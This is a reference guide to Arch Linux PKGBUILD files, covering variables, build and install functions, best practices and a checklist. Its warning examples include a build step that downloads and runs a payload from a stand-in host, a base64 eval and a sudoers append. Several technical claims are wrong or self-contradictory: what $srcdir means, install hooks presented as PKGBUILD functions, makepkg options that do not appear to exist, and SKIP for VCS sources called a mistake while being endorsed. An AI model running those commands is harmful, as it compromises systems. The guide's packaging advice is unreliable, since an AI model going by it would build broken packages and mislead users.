# PKGBUILD Schema Reference

This document provides detailed information about PKGBUILD structure, variables, and best practices.

## File Structure

A PKGBUILD is a Bash script that defines a package. It's sourced by `makepkg` during the build process.

```bash
#!/bin/bash
# PKGBUILD
pkgname=example
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
...
```

## Required Variables

### pkgname
The package name. **Must match the directory name.**

```bash
pkgname=firefox
```

### pkgver
The upstream version string.

```bash
pkgver=120.0
```

### pkgrel
The Arch packaging release number. Must be an integer ≥ 1.

```bash
pkgrel=1
```

### arch
Target architectures. Common values:
- `x86_64` - 64-bit x86
- `aarch64` - 64-bit ARM
- `armv7h` - 32-bit ARM (high-performance)
- `any` - Build for all architectures

```bash
arch=('x86_64' 'aarch64')
```

## Optional Variables

### pkgdesc
One-line description of the package.

```bash
pkgdesc="Web browser with focus on privacy"
```

### url
Upstream project URL.

```bash
url="https://www.mozilla.org/firefox/"
```

### license
SPDX identifier(s). Can be a single license or comma-separated list.

```bash
license=('MPL-2.0' 'GPL-3.0-only')
```

### depends
Runtime dependencies (installed when package is installed).

```bash
depends=('gtk3' 'nspr' 'nss')
```

### makedepends
Build-time-only dependencies.

```bash
makedepends=('meson' 'ninja' 'python')
```

### optdepends
Optional dependencies with descriptions.

```bash
optdepends=('gtk-commons: GTK+ common utilities'
            'libx11: X11 support')
```

### provides
Virtual packages this package provides.

```bash
provides=('firefox')
conflicts=('firefox-legacy')
```

### replaces
Packages this package replaces.

```bash
replaces=('old-firefox-package')
```

### source
Array of source URIs or local filenames.

```bash
source=(
    'https://example.com/app-1.0.tar.xz'
    'patches/fix-bug.patch'
)
```

### sha256sums / sha512sums / b2sums / md5sums / sha1sums
Integrity checksums. One per source entry.

```bash
sha256sums=('a1b2c3d4e5f6...')
```

### b2sums
BLAKE2 checksums (recommended for large files).

```bash
b2sums=('a1b2c3d4e5f6...')
```

### validpgpkeys
GPG fingerprints for signature verification.

```bash
validpgpkeys=('0x1234567890ABCDEF')
```

### options
Build flags.

```bash
options=('!strip' '!debug')
```

### install
Path to `.install` hook script.

```bash
install='firefox.install'
```

### backup
Files to preserve on upgrade.

```bash
backup=('etc/firefox/config')
```

## Lifecycle Functions

Functions are executed in order during the build process.

### pkgver()
Dynamic version computation. Used for VCS packages.

```bash
pkgver() {
    git describe --tags --dirty
}
```

**Security Note:** Should only read from cloned source, not remote endpoints.

### prepare()
Patch application, pre-build setup.

```bash
prepare() {
    patch -Np1 < patches/fix.patch
}
```

### build()
Compilation / transpilation.

```bash
build() {
    meson setup build
    meson compile -C build
}
```

### check()
Upstream test suite.

```bash
check() {
    meson test -C build
    return 0
}
```

### package()
Install files into `$pkgdir`.

```bash
package() {
    meson install -C build --destdir="$pkgdir"
}
```

### package_<name>()
Split-package functions for multi-package builds.

```bash
package_lib() {
    ...
}
package_bin() {
    ...
}
```

### post_install()
Post-installation hooks.

```bash
post_install() {
    chmod 644 /usr/bin/example
}
```

### pre_install()
Pre-installation hooks.

```bash
pre_install() {
    rm -rf /usr/share/doc/example
}
```

### pre_upgrade()
Pre-upgrade hooks.

```bash
pre_upgrade() {
    systemctl stop example.service
}
```

### post_upgrade()
Post-upgrade hooks.

```bash
post_upgrade() {
    systemctl start example.service
}
```

## Environment Variables

### $srcdir
Source directory (where PKGBUILD is located).

### $builddir
Build directory (created during build).

### $pkgdir
Package directory (where files are installed).

### $startdir
Starting directory (where makepkg was invoked).

### $CARGO_HOME
Cargo home directory (for Rust packages).

## Best Practices

### 1. Use HTTPS for all sources
```bash
# GOOD
source=('https://example.com/app.tar.xz')

# BAD
source=('http://example.com/app.tar.xz')
```

### 2. Always provide checksums
```bash
# GOOD
source=('https://example.com/app.tar.xz')
sha256sums=('a1b2c3d4e5f6...')

# BAD
sha256sums=('SKIP')
```

### 3. Use strong checksums
```bash
# GOOD
sha256sums=()
sha512sums=()

# AVOID (weak)
md5sums=()
sha1sums=()
```

### 4. Install only to $pkgdir
```bash
# GOOD
install -Dm755 app "$pkgdir/usr/bin/app"

# BAD
install -m755 app /usr/bin/app
```

### 5. Verify GPG signatures
```bash
# GOOD
makepkg --signfile=package.sig

# BAD
makepkg --nochecksig
```

### 6. Don't download at build time
```bash
# BAD - downloads inside build()
build() {
    curl -LO https://malicious.com/payload
    ./payload
}
```

### 7. Avoid eval and dynamic execution
```bash
# BAD
eval "$(base64 -d <<< '...')"

# GOOD
# Use static scripts
```

### 8. Don't modify system files
```bash
# BAD
echo "..." >> /etc/sudoers

# GOOD
# Only modify files in $pkgdir
```

## Common Mistakes

### 1. Mismatched source/checksum counts
```bash
source=('file1.tar.xz' 'file2.tar.xz')
sha256sums=('checksum1')  # Missing one!
```

### 2. Using SKIP for VCS sources
```bash
source=('https://github.com/user/repo.git')
sha256sums=('SKIP')  # VCS sources don't need checksums
```

### 3. Hard-coded credentials
```bash
# BAD
depends=('mysql://user:password@host/db')

# GOOD
depends=('mysql')
```

### 4. Shadowing packages
```bash
# BAD
provides=('openssl')  # Shadowing critical package

# GOOD
provides=('my-package')
```

### 5. Premature service activation
```bash
# BAD (in build/package)
systemctl enable my.service

# GOOD (in post_install)
post_install() {
    systemctl enable my.service
}
```

## Validation Checklist

- [ ] pkgname matches directory name
- [ ] pkgver and pkgrel are set
- [ ] arch is specified
- [ ] All sources have checksums
- [ ] No SKIP entries unless VCS
- [ ] No weak checksums (md5, sha1)
- [ ] All URLs use HTTPS
- [ ] No eval or dynamic execution
- [ ] No system file modifications
- [ ] No privilege escalation
- [ ] No credential exposure
